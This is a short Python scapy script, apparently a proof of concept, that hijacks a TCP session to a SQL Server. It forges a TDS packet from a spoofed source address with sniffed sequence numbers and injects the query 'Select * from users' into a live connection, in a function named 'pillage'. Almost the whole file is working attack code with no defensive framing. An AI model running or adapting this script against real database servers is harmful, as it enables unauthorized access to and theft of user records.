from scapy.all import *

srcip="192.168.37.1"
dstip="192.168.37.135"
dstport=1433 #default sqlserver port

#must be dynamically generated via sniffing
srcport=59275
seqnum=703947055
acknum=1177937577

class TDSPacket:
	type="01"
	status="09"
	channel="0000"
	pktnum="01"
	window="00"
	totalhlength="16000000"
	hlength="12000000"
	htype="0200"
	typevalue="0000000000000000"
	outstandingreqs="01000000"
	query=""

	def __init__(self,query):
		for x in query:
			self.query+=x.encode("hex")+"00"
		self.length='{:0>4}'.format(hex(len(query)*2+30)[2:])
		self.data=self.type+self.status+self.length+self.channel+self.pktnum+self.window+self.totalhlength+self.hlength+self.htype+self.typevalue+self.outstandingreqs+self.query	

def pillage():
	global dstip,srcip,dstport,srcport,seqnum,acknum
	tdsdata=TDSPacket("Select * from users")
	send(IP(dst=dstip,src=srcip)/TCP(flags="PA",dport=dstport,sport=srcport,seq=seqnum,ack=acknum)/tdsdata.data.decode("hex"))

if __name__ == "__main__":
	pillage()
